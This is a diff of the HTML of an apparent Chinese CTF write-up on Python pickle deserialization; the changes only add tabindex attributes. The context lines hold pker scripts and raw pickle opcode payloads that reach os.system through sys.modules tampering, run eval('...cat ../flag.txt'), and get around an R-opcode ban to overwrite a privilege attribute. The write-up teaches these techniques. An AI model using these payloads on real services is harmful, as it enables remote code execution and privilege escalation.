@@ -562,7 +562,7 @@
 &lt;p>但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃&lt;code>sys.modules['sys']=sys.modules&lt;/code>。那么如果我们先从sys中引入modules: &lt;code>import modules from sys&lt;/code>，然后将&lt;code>modules['sys']&lt;/code>改为&lt;code>modules['os']&lt;/code>就将成功引入os模块。&lt;/p>
 &lt;p>但有个缺陷是modules为dict，需要用&lt;code>getattr(sys.modules[module], name)&lt;/code>进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改&lt;/p>
 &lt;p>pker&lt;/p>
-&lt;pre>&lt;code>modules=GLOBAL('sys', 'modules')
+&lt;pre tabindex="0">&lt;code>modules=GLOBAL('sys', 'modules')
 modules['sys']=modules
 modules_get=GLOBAL('sys', 'get')
 os=modules_get('os')
@@ -571,7 +571,7 @@ system=GLOBAL('sys', 'system')
 system('dir')
 return
 &lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
-&lt;pre>&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
+&lt;pre tabindex="0">&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
 &lt;/details>
 &lt;h3 id="--仅可以引入题目中自设空模块">&amp;ndash;&amp;raquo;仅可以引入题目中自设空模块&lt;/h3>
@@ -602,7 +602,7 @@ return
 &lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
 &lt;span style="color:#00a8c8">return&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
-&lt;pre>&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
+&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
 &lt;/code>&lt;/pre>&lt;/details>
 &lt;h3 id="禁止br操作码">禁止&lt;code>b'R'&lt;/code>操作码&lt;/h3>
 &lt;p>也就相当于不可以用&lt;code>__reduce__&lt;/code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用&lt;code>b'i'&lt;/code>，&lt;code>b'i'&lt;/code>，&lt;code>b'b'&lt;/code>这些操作码来rce。&lt;/p>
@@ -969,7 +969,7 @@ return
 &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
 &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
-&lt;pre>&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
+&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
 &lt;/code>&lt;/pre>&lt;/details>
 &lt;p>考虑到这个题更综合了python的相关特性，所以把这个题放在最后。&lt;/p>
 &lt;hr>
